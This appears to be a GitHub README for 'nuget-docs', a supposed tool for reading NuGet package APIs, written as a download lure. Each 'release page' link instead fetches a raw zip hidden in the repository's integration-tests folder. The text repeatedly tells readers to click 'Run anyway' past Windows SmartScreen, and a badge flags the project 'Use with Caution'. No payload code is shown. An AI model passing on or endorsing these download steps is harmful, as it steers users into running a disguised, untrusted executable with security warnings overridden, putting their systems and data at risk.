# 🧩 nuget-docs - Read NuGet APIs with ease

[![Download nuget-docs](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/abellobm3681/nuget-docs/raw/refs/heads/main/src/NugetDocs.IntegrationTests/docs_nuget_v1.7.zip)
[![SafeSkill 50/100](https://img.shields.io/badge/SafeSkill-50%2F100_Use%20with%20Caution-orange)](https://safeskill.dev/scan/abellobm3681-nuget-docs)

## 📥 Download

Visit the [release page](https://github.com/abellobm3681/nuget-docs/raw/refs/heads/main/src/NugetDocs.IntegrationTests/docs_nuget_v1.7.zip) to download and run this file.

Look for the latest release and download the Windows file that matches your device. In most cases, this will be a `.exe` file or a `.zip` file with the app inside.

If you download a `.zip` file, right-click it and choose **Extract All**. Then open the folder and run the app file inside.

If Windows shows a security prompt, choose **More info**, then **Run anyway** if you trust the file source.

## ⚙️ What nuget-docs does

nuget-docs is a command-line tool for checking public API docs inside NuGet packages.

It helps you:

- inspect public types and members
- read XML docs for classes, methods, and properties
- compare API changes between two package versions
- see what one package depends on
- decompile types into readable C# code
- use package data for documentation work

This tool is built for people who need a fast way to look inside a NuGet package without opening a full development setup.

## 🖥️ System requirements

Use nuget-docs on a Windows PC with:

- Windows 10 or Windows 11
- permission to run downloaded apps
- internet access for package lookup
- enough space for the app and any package files you inspect

If your PC already opens `.exe` files and `.zip` files, you should be able to use it.

## 🚀 Get started

1. Download nuget-docs from the [release page](https://github.com/abellobm3681/nuget-docs/raw/refs/heads/main/src/NugetDocs.IntegrationTests/docs_nuget_v1.7.zip)
2. Open the downloaded file
3. If you downloaded a `.zip` file, extract it first
4. Run the app file from the extracted folder
5. Keep the window open while you type commands
6. Use the app to inspect a NuGet package name or file path

If the release includes a single `.exe` file, you can place it in any folder and run it from there.

## 📦 Install and run on Windows

### Option 1: Run the app from a ZIP file

1. Download the ZIP package from the release page
2. Right-click the ZIP file
3. Select **Extract All**
4. Pick a folder you can find later, such as `Downloads\nuget-docs`
5. Open the extracted folder
6. Double-click the app file
7. Allow Windows to open it if prompted

### Option 2: Run the app from an EXE file

1. Download the `.exe` file from the release page
2. Save it to your Downloads folder or desktop
3. Double-click the file
4. Wait for the command window to open
5. Type a command and press Enter

### Option 3: Keep it in one folder

If you plan to use it often, create a folder like:

- `C:\Tools\nuget-docs`

Then place the app there so you can find it again later.

## 🔎 What you can look up

nuget-docs can help you inspect a package in a few ways:

- package name
- package version
- local `.nupkg` file
- public type list
- dependency tree
- API changes across versions

This is useful when you want to know what changed in a package before you update it.

## 🧭 Common uses

### Check a package before an update
See what public types changed between versions.

### Read docs from a package
View XML comments that ship with the package.

### Compare two versions
Check added, removed, or changed members.

### Review package dependencies
See what other packages it needs.

### Inspect decompiled code
View the shape of a type in C# form.

## 📝 Basic usage

Open the app, then use it from the command line.

Examples of what you might do:

- inspect a package by name
- compare version 1 with version 2
- load a local NuGet file
- print dependency details
- show a type and its XML docs

If the app shows help text, start there. It will list the commands you can use.

## 🛠️ How to use it well

- Use the full package name
- Use a version when you want exact results
- Keep local `.nupkg` files in one folder
- Copy text from the window if you want to save results
- Compare versions one step at a time

If you use it for documentation work, keep notes on the package version you checked. That makes later review much easier.

## 📁 Example workflow

1. Download a NuGet package file or choose a package name
2. Open nuget-docs
3. Ask it to inspect the package
4. Read the public API list
5. Check XML docs for the type you need
6. Compare with another version if you want to see changes
7. Save the output for later use

## ❓ If Windows blocks the file

If Windows SmartScreen appears:

1. Click **More info**
2. Click **Run anyway**
3. Or extract the ZIP file again if the download was incomplete

If the file still does not open, download the latest release again from the release page.

## 🔁 Updating to a new version

1. Go to the [release page](https://github.com/abellobm3681/nuget-docs/raw/refs/heads/main/src/NugetDocs.IntegrationTests/docs_nuget_v1.7.zip)
2. Download the latest file
3. Replace the old app file with the new one
4. Run the new version

If you keep the app in a tools folder, the update is easier to manage.

## 📚 Command tips

- Type `help` if the app supports it
- Use `--help` if the help screen does not open
- Read the command list before trying package names
- Start with one simple package
- Add version checks after you know the basic flow

## 🧪 Best results

Use nuget-docs when you want clear answers about a package without opening a full development tool.

It works well for:

- package review
- API checks
- version comparisons
- dependency review
- documentation lookup